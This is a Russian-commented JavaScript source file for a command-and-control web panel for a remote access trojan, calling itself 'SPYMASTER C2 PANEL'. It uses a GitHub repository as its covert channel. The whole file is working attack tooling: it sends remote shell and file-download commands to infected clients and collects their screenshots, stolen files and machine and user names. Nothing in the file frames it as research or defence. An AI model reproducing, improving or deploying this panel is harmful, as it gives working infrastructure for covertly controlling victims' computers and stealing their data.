// ============= SPYMASTER C2 PANEL - ИСПРАВЛЕННАЯ ВЕРСИЯ =============
// АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ
// FIX: УЛУЧШЕННАЯ ОТПРАВКА КОМАНД + ПРОВЕРКА

// ============= КОНФИГУРАЦИЯ =============
let GITHUB_USERNAME = "твой_логин";
let GITHUB_REPO = "rat_c2";
let GITHUB_TOKEN = "";

// Загрузка сохранённых данных
try {
    if (typeof CONFIG !== 'undefined') {
        GITHUB_USERNAME = CONFIG.GITHUB_USERNAME || GITHUB_USERNAME;
        GITHUB_TOKEN = CONFIG.GITHUB_TOKEN || "";
    }
} catch(e) {}

if (!GITHUB_TOKEN) {
    const savedToken = localStorage.getItem("github_token");
    if (savedToken) {
        GITHUB_TOKEN = savedToken;
    } else {
        GITHUB_TOKEN = prompt("🔐 ВВЕДИТЕ ТОКЕН GITHUB:");
        if (GITHUB_TOKEN) localStorage.setItem("github_token", GITHUB_TOKEN);
    }
}

if (GITHUB_USERNAME === "твой_логин") {
    const savedUser = localStorage.getItem("github_username");
    if (savedUser) {
        GITHUB_USERNAME = savedUser;
    } else {
        GITHUB_USERNAME = prompt("👤 ВВЕДИТЕ LOGIN GITHUB:");
        if (GITHUB_USERNAME) localStorage.setItem("github_username", GITHUB_USERNAME);
    }
}

// ============= ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =============
const API_URL = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents`;
const HEADERS = {
    "Authorization": `token ${GITHUB_TOKEN}`,
    "Accept": "application/vnd.github.v3+json"
};

let clients = [];
let seenFiles = [];
let autoRefresh = null;
let currentClient = "all";
let lastCommandTime = 0;
let pendingCommands = [];

// ============= ФУНКЦИЯ ОТПРАВКИ КОМАНДЫ (С ПОВТОРАМИ) =============
async function sendCommandWithRetry(command, retries = 3, delay = 1000) {
    for (let i = 0; i < retries; i++) {
        try {
            const result = await sendCommandToGithub(command);
            if (result) {
                addLog(`✅ КОМАНДА ОТПРАВЛЕНА: ${command} (попытка ${i+1})`, "success");
                return true;
            }
        } catch (error) {
            addLog(`⚠️ ПОВТОР ${i+1}/${retries}: ${error.message}`, "error");
            await new Promise(r => setTimeout(r, delay));
        }
    }
    addLog(`❌ НЕ УДАЛОСЬ ОТПРАВИТЬ КОМАНДУ: ${command}`, "error");
    return false;
}

// ============= ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ =============
async function sendCommandToGithub(command) {
    if (!command) return false;
    
    const targetClient = currentClient || "all";
    let finalCommand = command;
    if (targetClient !== "all") {
        finalCommand = `@${targetClient} ${command}`;
    }
    
    addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system");
    
    try {
        // 1. Сначала пытаемся создать новый файл (более надёжно)
        const timestamp = Date.now();
        const tempFile = `temp_cmd_${timestamp}.txt`;
        
        // Пробуем создать временный файл с командой
        const tempData = {
            message: `temp_command_${timestamp}`,
            content: btoa(unescape(encodeURIComponent(finalCommand + "\n"))),
            branch: "main"
        };
        
        let tempResult = await githubRequest(`${API_URL}/${tempFile}`, "PUT", tempData);
        
        if (tempResult && (tempResult.status === 201 || tempResult.status === 200)) {
            addLog(`📝 ВРЕМЕННЫЙ ФАЙЛ СОЗДАН: ${tempFile}`, "success");
            
            // 2. Через секунду добавляем команду в основной файл
            await new Promise(r => setTimeout(r, 500));
            
            // Получаем текущий commands.txt
            let response = await githubRequest(`${API_URL}/commands.txt`);
            
            let currentContent = "";
            let sha = null;
            
            if (response && response.content) {
                currentContent = atob(response.content);
                sha = response.sha;
                addLog(`📖 ТЕКУЩИЕ КОМАНДЫ: ${currentContent || "(пусто)"}`, "system");
            }
            
            const newContent = currentContent + finalCommand + "\n";
            const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
            
            const putData = {
                message: `Command: ${command}`,
                content: encodedContent,
                branch: "main"
            };
            if (sha) putData.sha = sha;
            
            const mainResult = await githubRequest(`${API_URL}/commands.txt`, "PUT", putData);
            
            if (mainResult && (mainResult.status === 201 || mainResult.status === 200 || mainResult.commit)) {
                addLog(`✅ КОМАНДА ЗАПИСАНА: ${command}`, "success");
                
                // 3. Удаляем временный файл
                await new Promise(r => setTimeout(r, 300));
                if (tempResult && tempResult.sha) {
                    const deleteData = {
                        message: `delete_temp_${timestamp}`,
                        sha: tempResult.sha,
                        branch: "main"
                    };
                    await githubRequest(`${API_URL}/${tempFile}`, "DELETE", deleteData);
                    addLog(`🗑 ВРЕМЕННЫЙ ФАЙЛ УДАЛЁН`, "system");
                }
                
                return true;
            }
        }
        
        // Если временный файл не сработал - пробуем прямой метод
        addLog(`🔄 ПРОБУЮ ПРЯМОЙ МЕТОД...`, "system");
        
        let response = await githubRequest(`${API_URL}/commands.txt`);
        let currentContent = "";
        let sha = null;
        
        if (response && response.content) {
            currentContent = atob(response.content);
            sha = response.sha;
        }
        
        const newContent = currentContent + finalCommand + "\n";
        const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
        
        const putData = {
            message: `Command: ${command}`,
            content: encodedContent,
            branch: "main"
        };
        if (sha) putData.sha = sha;
        
        const result = await githubRequest(`${API_URL}/commands.txt`, "PUT", putData);
        
        if (result && (result.status === 201 || result.status === 200 || result.commit)) {
            addLog(`✅ КОМАНДА ЗАПИСАНА (прямой метод): ${command}`, "success");
            return true;
        }
        
        return false;
        
    } catch (error) {
        addLog(`❌ ОШИБКА ОТПРАВКИ: ${error.message}`, "error");
        return false;
    }
}

// ============= ФУНКЦИЯ ПРОВЕРКИ commands.txt =============
async function verifyCommandsFile() {
    try {
        const response = await githubRequest(`${API_URL}/commands.txt`);
        if (response && response.content) {
            const content = atob(response.content);
            addLog(`🔍 ПРОВЕРКА commands.txt: ${content || "(пусто)"}`, "system");
            return content;
        } else {
            addLog(`⚠️ ФАЙЛ commands.txt НЕ СУЩЕСТВУЕТ`, "warning");
            // Создаём пустой файл
            const createData = {
                message: "init commands",
                content: btoa(""),
                branch: "main"
            };
            await githubRequest(`${API_URL}/commands.txt`, "PUT", createData);
            addLog(`📝 СОЗДАН ПУСТОЙ commands.txt`, "success");
            return "";
        }
    } catch (error) {
        addLog(`❌ ОШИБКА ПРОВЕРКИ: ${error.message}`, "error");
        return null;
    }
}

// ============= УЛУЧШЕННАЯ ОТПРАВКА КОМАНДЫ (ВНЕШНЯЯ) =============
async function sendCommand(command, clientId = null) {
    if (!command) return;
    
    const targetClient = clientId || currentClient || "all";
    addLog(`🎯 ОТПРАВКА КОМАНДЫ: ${command}`, "system");
    
    // Показываем индикатор отправки
    showSendingIndicator(true);
    
    // Проверяем что commands.txt существует
    await verifyCommandsFile();
    
    // Отправляем команду
    const result = await sendCommandWithRetry(command, 3, 1000);
    
    if (result) {
        showNotification(`✅ Команда отправлена: ${command}`, "success");
        // Обновляем список команд через 1 секунду
        setTimeout(() => verifyCommandsFile(), 1000);
    } else {
        showNotification(`❌ Ошибка отправки: ${command}`, "error");
    }
    
    showSendingIndicator(false);
}

// ============= ИНДИКАТОР ОТПРАВКИ =============
function showSendingIndicator(show) {
    let indicator = document.getElementById("sendingIndicator");
    if (!indicator) {
        indicator = document.createElement("div");
        indicator.id = "sendingIndicator";
        indicator.style.cssText = `
            position: fixed;
            top: 10px;
            right: 10px;
            background: #ff8800;
            color: #fff;
            padding: 8px 15px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            z-index: 1000;
            display: none;
        `;
        indicator.innerHTML = "⏳ ОТПРАВКА...";
        document.body.appendChild(indicator);
    }
    indicator.style.display = show ? "block" : "none";
}

// ============= ОБНОВЛЁННАЯ ФУНКЦИЯ githubRequest =============
async function githubRequest(url, method = "GET", data = null) {
    if (!GITHUB_TOKEN) {
        addLog("❌ ТОКЕН НЕ ЗАДАН!", "error");
        return null;
    }
    
    try {
        const options = {
            method: method,
            headers: HEADERS
        };
        
        if (data && (method === "PUT" || method === "DELETE")) {
            options.body = JSON.stringify(data);
        }
        
        const response = await fetch(url, options);
        const result = await response.json();
        
        // Добавляем статус в результат для удобства
        result.status = response.status;
        
        if (response.status === 401) {
            addLog("❌ ОШИБКА АВТОРИЗАЦИИ! Токен неверный", "error");
            return null;
        }
        
        if (response.status === 409) {
            addLog("⚠️ КОНФЛИКТ (409) - повторяю запрос", "warning");
            // При конфликте пробуем получить свежие данные
            await new Promise(r => setTimeout(r, 500));
            const retryResponse = await fetch(url, options);
            return await retryResponse.json();
        }
        
        if (response.status === 404 && method !== "PUT") {
            return null;
        }
        
        if (response.status === 403) {
            addLog("⚠️ ЛИМИТ ЗАПРОСОВ! Подождите", "warning");
            return null;
        }
        
        return result;
        
    } catch (error) {
        addLog(`❌ ОШИБКА: ${error.message}`, "error");
        return null;
    }
}

// ============= УЛУЧШЕННАЯ ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
async function loadResults() {
    try {
        const response = await githubRequest(API_URL);
        if (!response || !Array.isArray(response)) return;
        
        const results = response.filter(f => f.name.startsWith("result_"));
        const screenshots = response.filter(f => f.name.startsWith("screenshot_"));
        const files = response.filter(f => f.name.startsWith("file_"));
        
        // Обновляем статистику
        document.getElementById("resultsCount").innerText = results.length;
        document.getElementById("screensCount").innerText = screenshots.length;
        document.getElementById("clientsCount").innerText = clients.length;
        
        // Обрабатываем новые результаты
        for (const file of [...results, ...screenshots, ...files]) {
            if (!seenFiles.includes(file.name)) {
                seenFiles.push(file.name);
                
                if (file.name.startsWith("result_")) {
                    try {
                        const content = await fetch(file.download_url + "?t=" + Date.now()).then(r => r.text());
                        addLog(`📥 НОВЫЙ РЕЗУЛЬТАТ: ${file.name}`, "result");
                        const lines = content.split('\n').slice(0, 10);
                        for (const line of lines) {
                            if (line.trim()) addLog(`   ${line}`, "result");
                        }
                        parseClientInfo(content);
                    } catch(e) {
                        addLog(`⚠️ Не удалось прочитать ${file.name}`, "error");
                    }
                }
                
                if (file.name.startsWith("screenshot_")) {
                    addLog(`📸 НОВЫЙ СКРИНШОТ: ${file.name}`, "success");
                    updateScreensGrid();
                }
                
                if (file.name.startsWith("file_")) {
                    addLog(`📁 НОВЫЙ ФАЙЛ: ${file.name}`, "success");
                    updateFilesList();
                }
            }
        }
        
        updateClientsList();
        updateScreensGrid();
        updateFilesList();
        
    } catch (error) {
        addLog(`❌ Ошибка загрузки: ${error.message}`, "error");
    }
}

// ============= ОСТАЛЬНЫЕ ФУНКЦИИ (ОСТАЮТСЯ БЕЗ ИЗМЕНЕНИЙ) =============
function addLog(message, type = "system") {
    const logContainer = document.getElementById("logContainer");
    const time = new Date().toLocaleTimeString();
    const logEntry = document.createElement("div");
    logEntry.className = `log-entry ${type}`;
    logEntry.innerHTML = `<span style="color:#666">[${time}]</span> ${message}`;
    logContainer.insertBefore(logEntry, logContainer.firstChild);
    while (logContainer.children.length > 300) {
        logContainer.removeChild(logContainer.lastChild);
    }
}

function showNotification(message, type = "info") {
    const notification = document.createElement("div");
    notification.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: ${type === "success" ? "#00aa00" : type === "error" ? "#aa0000" : "#1a1f4e"};
        color: #fff;
        padding: 10px 20px;
        border-radius: 5px;
        font-family: monospace;
        font-size: 12px;
        z-index: 1000;
        animation: fadeInOut 3s ease;
    `;
    notification.innerText = message;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
}

function parseClientInfo(content) {
    if (content.includes("[Connected]") || content.includes("PC:")) {
        const pcMatch = content.match(/PC:\s*([^\n]+)/);
        const userMatch = content.match(/User:\s*([^\n]+)/);
        
        if (pcMatch) {
            const clientId = pcMatch[1].trim();
            if (!clients.find(c => c.id === clientId)) {
                clients.push({
                    id: clientId,
                    user: userMatch ? userMatch[1].trim() : "Unknown",
                    firstSeen: new Date().toLocaleString()
                });
                addLog(`💻 НОВЫЙ КЛИЕНТ: ${clientId}`, "client");
                showNotification(`Новый клиент: ${clientId}`, "success");
            }
        }
    }
}

// ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + " B";
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + " KB";
    return (bytes / (1024 * 1024)).toFixed(1) + " MB";
}

function showModal(imageUrl, title) {
    let modal = document.getElementById("imageModal");
    if (!modal) {
        modal = document.createElement("div");
        modal.id = "imageModal";
        modal.className = "modal";
        modal.innerHTML = `
            <span class="modal-close">&times;</span>
            <div class="modal-content">
                <div class="modal-title"></div>
                <img src="" alt="Screenshot">
            </div>
        `;
        document.body.appendChild(modal);
        modal.querySelector(".modal-close").onclick = () => modal.classList.remove("active");
        modal.onclick = (e) => { if (e.target === modal) modal.classList.remove("active"); };
    }
    modal.querySelector("img").src = imageUrl;
    modal.querySelector(".modal-title").innerHTML = title || "Скриншот";
    modal.classList.add("active");
}

async function updateScreensGrid() {
    const response = await githubRequest(API_URL);
    if (!response || !Array.isArray(response)) return;
    const screenshots = response.filter(f => f.name.startsWith("screenshot_")).reverse();
    const grid = document.getElementById("screensGrid");
    if (screenshots.length === 0) {
        grid.innerHTML = '<div class="empty-message">📭 Нет скриншотов</div>';
        return;
    }
    grid.innerHTML = "";
    for (const screenshot of screenshots) {
        const card = document.createElement("div");
        card.className = "screenshot-card";
        card.onclick = () => showModal(screenshot.download_url, screenshot.name);
        card.innerHTML = `<img src="${screenshot.download_url}?t=${Date.now()}" alt="${screenshot.name}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'200\' height=\'150\'%3E%3Crect width=\'200\' height=\'150\' fill=\'%230a0e27\'/%3E%3Ctext x=\'100\' y=\'75\' fill=\'%2300ff41\' text-anchor=\'middle\'%3E📸 ${screenshot.name}%3C/text%3E%3C/svg%3E'"><div class="info">📸 ${screenshot.name}</div>`;
        grid.appendChild(card);
    }
}

async function updateFilesList() {
    const response = await githubRequest(API_URL);
    if (!response || !Array.isArray(response)) return;
    const files = response.filter(f => f.name.startsWith("file_")).reverse();
    const list = document.getElementById("filesList");
    if (files.length === 0) {
        list.innerHTML = '<div class="empty-message">📭 Нет загруженных файлов</div>';
        return;
    }
    list.innerHTML = "";
    for (const file of files) {
        const item = document.createElement("div");
        item.className = "file-item";
        const fileSize = file.size ? formatFileSize(file.size) : "?";
        item.innerHTML = `<span class="file-name">📄 ${escapeHtml(file.name)} (${fileSize})</span><button class="file-download" onclick="window.open('${file.download_url}', '_blank')">⬇️ СКАЧАТЬ</button>`;
        list.appendChild(item);
    }
}

function updateClientsList() {
    const select = document.getElementById("clientSelect");
    const clientsDiv = document.getElementById("clientsList");
    select.innerHTML = '<option value="all">📱 ВСЕ КЛИЕНТЫ</option>';
    if (clients.length === 0) {
        clientsDiv.innerHTML = '<div class="empty-message">💤 Нет подключенных клиентов</div>';
        return;
    }
    clientsDiv.innerHTML = "";
    for (const client of clients) {
        select.innerHTML += `<option value="${client.id}">🖥️ ${client.id}</option>`;
        const clientCard = document.createElement("div");
        clientCard.className = "client-card";
        clientCard.setAttribute("data-client", client.id);
        clientCard.onclick = () => {
            document.querySelectorAll(".client-card").forEach(c => c.classList.remove("selected"));
            clientCard.classList.add("selected");
            document.getElementById("clientSelect").value = client.id;
            currentClient = client.id;
            addLog(`🎯 ВЫБРАН КЛИЕНТ: ${client.id}`, "success");
        };
        clientCard.innerHTML = `<div class="client-name">🖥️ ${escapeHtml(client.id)}</div><div class="client-info">👤 ${escapeHtml(client.user)}</div><div class="client-time">🕐 Подключен: ${escapeHtml(client.firstSeen)}</div>`;
        clientsDiv.appendChild(clientCard);
    }
}

async function clearCommands() {
    try {
        const url = `${API_URL}/commands.txt`;
        const response = await githubRequest(url);
        if (response && response.sha) {
            const putData = { message: "Clear commands", content: btoa(""), sha: response.sha, branch: "main" };
            await githubRequest(url, "PUT", putData);
            addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success");
        }
    } catch (error) {
        addLog(`❌ Ошибка очистки: ${error.message}`, "error");
    }
}

async function clearAllFiles() {
    if (!confirm("💣 Удалить ВСЕ файлы? Файлы сайта НЕ будут затронуты!")) return;
    try {
        const response = await githubRequest(API_URL);
        if (response && Array.isArray(response)) {
            const protectedFiles = ["index.html", "style.css", "script.js", "config.js", ".gitignore"];
            let deleted = 0;
            for (const file of response) {
                if (protectedFiles.includes(file.name)) continue;
                const deleteData = { message: `Delete ${file.name}`, sha: file.sha, branch: "main" };
                await githubRequest(`${API_URL}/${file.name}`, "DELETE", deleteData);
                deleted++;
                await new Promise(r => setTimeout(r, 100));
            }
            addLog(`💣 УДАЛЕНО: ${deleted} файлов`, "success");
            seenFiles = [];
            clients = [];
            loadResults();
        }
    } catch (error) {
        addLog(`❌ Ошибка: ${error.message}`, "error");
    }
}

async function testConnection() {
    addLog("🔌 ПРОВЕРКА ПОДКЛЮЧЕНИЯ...", "system");
    try {
        const response = await fetch("https://api.github.com/user", { headers: HEADERS });
        if (response.ok) {
            const user = await response.json();
            addLog(`✅ ПОДКЛЮЧЕНО! ПОЛЬЗОВАТЕЛЬ: ${user.login}`, "success");
            document.getElementById("statusIndicator").classList.add("online");
            document.getElementById("statusText").innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
            await verifyCommandsFile();
            return true;
        } else {
            addLog(`❌ ОШИБКА: ${response.status}`, "error");
            return false;
        }
    } catch (error) {
        addLog(`❌ ОШИБКА: ${error.message}`, "error");
        return false;
    }
}

function startAutoRefresh() {
    if (autoRefresh) clearInterval(autoRefresh);
    autoRefresh = setInterval(() => loadResults(), 5000);
    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО", "system");
}

// ============= ИНИЦИАЛИЗАЦИЯ =============
async function init() {
    addLog("🐀 SPYMASTER C2 PANEL v5.0 (FIXED)", "system");
    addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system");
    
    // Добавляем стили
    const style = document.createElement('style');
    style.textContent = `@keyframes fadeInOut { 0% { opacity: 0; transform: translateX(20px); } 15% { opacity: 1; transform: translateX(0); } 85% { opacity: 1; transform: translateX(0); } 100% { opacity: 0; transform: translateX(20px); } }.modal.active { display: flex !important; } .modal-content { position: relative; max-width: 90%; max-height: 90%; } .modal-title { color: #00ff41; font-family: monospace; padding: 10px; text-align: center; background: #0a0e27; border: 1px solid #00ff41; border-radius: 8px 8px 0 0; } .modal img { max-width: 100%; max-height: calc(90vh - 50px); border: 1px solid #00ff41; border-radius: 0 0 8px 8px; }`;
    document.head.appendChild(style);
    
    await testConnection();
    startAutoRefresh();
    await verifyCommandsFile();
    
    // Привязываем кнопки
    document.querySelectorAll(".cmd-btn").forEach(btn => {
        btn.addEventListener("click", () => sendCommand(btn.getAttribute("data-cmd")));
    });
    document.querySelectorAll(".cmd-small").forEach(btn => {
        if (!btn.id) btn.addEventListener("click", () => sendCommand(btn.getAttribute("data-cmd")));
    });
    
    document.getElementById("sendCustomBtn")?.addEventListener("click", () => {
        const cmd = document.getElementById("customCmd").value;
        if (cmd) sendCommand(cmd);
        document.getElementById("customCmd").value = "";
    });
    
    document.getElementById("downloadBtn")?.addEventListener("click", () => {
        const path = document.getElementById("downloadPath").value;
        if (path) sendCommand(`/download ${path}`);
    });
    
    document.getElementById("shellBtn")?.addEventListener("click", () => {
        const cmd = document.getElementById("shellCmd").value;
        if (cmd) sendCommand(`/cmd ${cmd}`);
    });
    
    document.getElementById("clearCommandsBtn")?.addEventListener("click", clearCommands);
    document.getElementById("clearAllBtn")?.addEventListener("click", clearAllFiles);
    document.getElementById("refreshBtn")?.addEventListener("click", () => loadResults());
    
    document.getElementById("clientSelect")?.addEventListener("change", (e) => {
        currentClient = e.target.value;
        addLog(`🎯 ВЫБРАН: ${currentClient === "all" ? "ВСЕ КЛИЕНТЫ" : currentClient}`, "system");
    });
}

// Запуск
if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
} else {
    init();
}
